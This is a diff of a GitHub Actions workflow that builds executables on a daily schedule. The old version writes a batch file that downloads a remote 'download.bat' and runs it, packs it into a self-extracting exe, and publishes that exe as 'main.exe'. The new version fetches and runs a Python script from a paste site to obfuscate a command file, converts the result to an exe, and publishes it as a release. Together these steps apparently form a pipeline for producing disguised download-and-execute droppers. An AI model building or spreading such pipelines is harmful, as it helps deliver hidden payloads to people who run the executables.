@@ -8,78 +8,60 @@ on:
     - cron: '0 0 * * *'  # Runs every day at midnight UTC
   workflow_dispatch:  # Allows manual triggering
 
-permissions:
-  contents: write
-  pull-requests: write
-  repository-projects: write
-
 jobs:
-  build:
+  obfuscate:
     runs-on: windows-latest
-
+    permissions:
+      contents: write
+      pull-requests: write
+      repository-projects: write
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v2
+      - name: Checkout repository
+        uses: actions/checkout@v3
 
-    - name: Create Batch Script
-      run: |
-        $batchScript = @"
-@echo off
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/43a1723/test/releases/download/AutoBuild/download.bat' -OutFile 'download.bat'"
-start /wait cmd /C download.bat
-"@
-        $batchScript | Set-Content -Path script.bat -Encoding utf8
+      - name: Download main.py
+        run: |
+          Invoke-WebRequest -Uri https://rentry.co/rbbydedw/raw -OutFile main.py
 
-    - name: Create IExpress Configuration
-      run: |
-        # Save IExpress configuration to a file
-        $iexpressScript = @"
-        [Version]
-        Signature="$Windows NT$"
-        [Components]
-        ; Specify the batch file
-        ; This will package script.bat into the executable
-        [Setup]
-        ; Define IExpress settings
-        PackageType=SELF_EXTRACT
-        [Files]
-        ; Define the files to include
-        SourceFiles=script.bat
-        ; Specify the output file name
-        OutputPath=dist/script.exe
-        "@
-        $iexpressScript | Set-Content -Path script.sed -Encoding utf8
+      - name: Obfuscate run.cmd
+        run: |
+          python main.py
 
-    - name: Compile Batch Script with IExpress
-      run: |
-        iexpress /N /Q /M script.sed
+      - name: Download bat2exeIEXP.bat
+        run: |
+          Invoke-WebRequest -Uri https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/iexpress/bat2exeIEXP.bat -OutFile bat2exeIEXP.bat
 
-    - name: Delete-tag-and-release
-      uses: dev-drprasad/delete-tag-and-release@v1.1
-      with:
-        tag_name: AutoBuildExe
-        delete_release: true
-        github_token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Convert BAT to EXE
+        run: |
+          # Convert the BAT file to EXE
+          Start-Process -FilePath cmd.exe -ArgumentList '/c bat2exeIEXP.bat run-obf.bat' -Wait
 
-    - name: Create Release
-      id: create_release
-      uses: actions/create-release@latest
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      with:
-        tag_name: AutoBuildExe
-        release_name: AutoBuildExe
-        body: Obfuscated batch script
-        draft: false
-        prerelease: false
+      - name: Delete-tag-and-release
+        uses: dev-drprasad/delete-tag-and-release@v1.1
+        with:
+          tag_name: AutoBuildExe
+          delete_release: true
+          github_token: ${{ secrets.GITHUB_TOKEN }}
 
-    - name: Upload Release Asset
-      id: upload-release-asset 
-      uses: actions/upload-release-asset@v1
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      with:
-        upload_url: ${{ steps.create_release.outputs.upload_url }}
-        asset_path: dist/script.exe
-        asset_name: main.exe
-        asset_content_type: application/octet-stream
+      - name: Create Release
+        id: create_release
+        uses: actions/create-release@latest
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          tag_name: AutoBuildExe
+          release_name: AutoBuildExe
+          body: Obfuscated run.cmd file
+          draft: false
+          prerelease: false
+
+      - name: Upload Release Asset
+        id: upload-release-asset 
+        uses: actions/upload-release-asset@v1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          upload_url: ${{ steps.create_release.outputs.upload_url }}
+          asset_path: run-obf.exe
+          asset_name: run-obf.exe
+          asset_content_type: application/octet-stream
